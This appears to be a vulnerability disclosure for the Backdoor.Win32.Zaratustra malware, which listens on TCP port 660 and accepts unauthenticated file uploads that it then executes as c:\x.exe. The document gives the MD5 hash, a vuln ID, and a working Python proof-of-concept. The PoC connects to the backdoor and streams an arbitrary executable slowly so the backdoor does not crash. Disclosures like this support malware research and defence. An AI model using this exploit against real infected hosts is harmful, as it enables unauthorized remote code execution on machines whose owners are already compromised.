Threat: Backdoor.Win32.Zaratustra
Vulnerability: Unauthenticated Remote File Write (Remote Code Exec)
Description: Zaratustra malware listens on TCP port 660. Third-party
attackers who can reach infected systems can use a socket program to write
binary data to execute. The malware then writes that data to a file named
"x.exe" under c: drive and will execute upon completion of the downloaded
code.
Type: PE32
MD5: f240c16af2189ea9c94f317281ce7e59
Vuln ID: MVID-2021-0315
Dropped files: x.exe
Disclosure: 08/05/2021

Exploit/PoC:
from socket import *
import time
#Has to be done slowly or will crash the backdoor.
#Tested sucessfully with an 11.5 KB executable
#Compile #define WIN32_LEAN_AND_MEAN, linker strip executable etc.. try
make small as possible.

HOST = "x.x.x.x"
PORT = 660
BUF_SIZE = 32

s=socket(AF_INET, SOCK_STREAM)
s.connect((HOST, PORT))

with open("DOOM.exe", "rb") as f:
    while True:
        bytez = f.read(BUF_SIZE)
        if not bytez:
            break
        s.send(bytez)
        time.sleep(0.5)

print(" Backdoor.Win32.Zaratustra / Unauthenticated Remote File Write -
RCE")
print("MD5: f240c16af2189ea9c94f317281ce7e59")
